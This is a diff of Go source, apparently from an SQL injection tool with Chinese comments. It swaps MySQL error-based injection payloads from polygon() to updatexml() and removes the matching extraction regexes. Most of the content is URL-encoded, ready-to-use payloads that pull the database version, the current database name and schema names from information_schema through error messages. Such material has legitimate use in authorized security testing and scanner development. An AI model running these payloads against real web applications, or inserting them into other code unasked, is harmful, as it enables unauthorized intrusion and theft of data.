@@ -36,26 +36,15 @@ const (
 	// UpdatexmlFunc 报错注入检测函数
 	// 这个报错函数在后续利用中较麻烦，所以采用Polygon做后续
 	UpdatexmlFunc = "updatexml()"
-	// PolygonErrorKeyword 报错回显的关键字
-	PolygonErrorKeyword = "Illegal non geometric"
+	// UpdatexmlErrorKeyword 报错回显的关键字
+	UpdatexmlErrorKeyword = "XPATH syntax error"
 	// ErrorBasedKeyword 检测到报错注入的关键字
 	ErrorBasedKeyword = "Incorrect parameter count in the call to native function"
-	// PolygonVersionPayload 报错注入获得版本
-	PolygonVersionPayload = "%20Or%20polygon((select%20*%20from" +
-		"(select%20*%20from(select%20version())a)b))--+"
-	// PolygonVersionRegex 报错获得版本的正则
-	PolygonVersionRegex = "Illegal.*version.*select\\s'(.*?)' AS.*?"
-	// PolygonDatabasePayload 报错注入获得当前数据库
-	PolygonDatabasePayload = "%20Or%20polygon((select%20*%20from" +
-		"(select%20*%20from(select%20database())a)b))--+"
-	// PolygonDatabaseRegex 报错获得当前数据库的正则
-	PolygonDatabaseRegex = "Illegal.*database.*select\\s'(.*?)' AS.*?"
-	// PolygonAllDatabasesPayload 报错获得所有数据库
-	PolygonAllDatabasesPayload = "%20Or%20polygon((select%20*%20from" +
-		"(select%20*%20from(select%20group_concat(schema_name)%20from" +
-		"%20information_schema.schemata%20)a)b))--+"
-	// PolygonDataRegex 报错获得数据的正则
-	PolygonDataRegex = "Illegal.*group_concat.*select\\s'(.*?)' AS.*?"
-	// PolygonFinalDataRegex 报错获得最终数据的正则
-	PolygonFinalDataRegex = "Illegal.*group_concat.*select\\s'(.*?)'\\svalue\\sfound"
+	// UpdatexmlVersionPayload 报错注入获得版本
+	UpdatexmlVersionPayload = "%20and%20updatexml(2,concat(0x7e,version(),0x7e),1)--+"
+	// UpdatexmlDatabasePayload 报错注入获得当前数据库
+	UpdatexmlDatabasePayload = "%20and%20updatexml(2,concat(0x7e,database(),0x7e),1)--+"
+	// UpdatexmlAllDatabasesPayload 报错获得所有数据库
+	UpdatexmlAllDatabasesPayload = "%20and%20updatexml(2,concat(0x7e,(select%20schema_name%20" +
+		"from%20information_schema.schemata%20limit%200,1),0x7e),1)--+"
 )
